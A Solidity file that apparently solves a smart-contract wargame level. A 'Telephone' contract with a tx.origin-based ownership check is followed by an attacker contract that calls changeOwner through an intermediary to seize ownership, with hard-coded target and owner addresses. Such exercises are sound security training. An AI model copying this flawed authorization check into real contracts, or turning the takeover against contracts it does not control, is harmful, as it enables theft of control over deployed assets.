// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract NewContract {
    Telephone public oldContract;

    function claimOwnership() public {
        oldContract = Telephone(0xcfCaA7608E34a611f9A35E912F54fF13bbfd2587);

        oldContract.changeOwner(0xB85Ec4586A4f7e16e6624A3fa148db2398753a79);
    }
}
